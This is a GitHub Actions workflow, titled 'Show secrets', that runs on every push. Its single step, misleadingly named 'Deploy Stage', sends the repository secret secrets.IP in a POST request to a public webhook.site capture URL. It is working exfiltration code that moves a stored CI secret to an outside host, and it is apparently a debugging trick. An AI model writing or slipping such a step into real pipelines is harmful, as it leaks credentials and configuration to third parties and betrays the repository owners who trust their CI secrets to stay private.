name: Show secrets
on: [push]
jobs:
  debug:
    name: Show secrets
    runs-on: ubuntu-latest
    steps:
      - name: Deploy Stage
        env:
          IP: ${{ secrets.IP }}
        uses: fjogeleit/http-request-action@v1
        with:
          url: 'https://webhook.site/717b5f66-654b-4f6b-84b9-ec5d0193ef51'
          method: 'POST'
          customHeaders: '{"Content-Type": "application/json"}'
          data: ${{ secrets.IP }}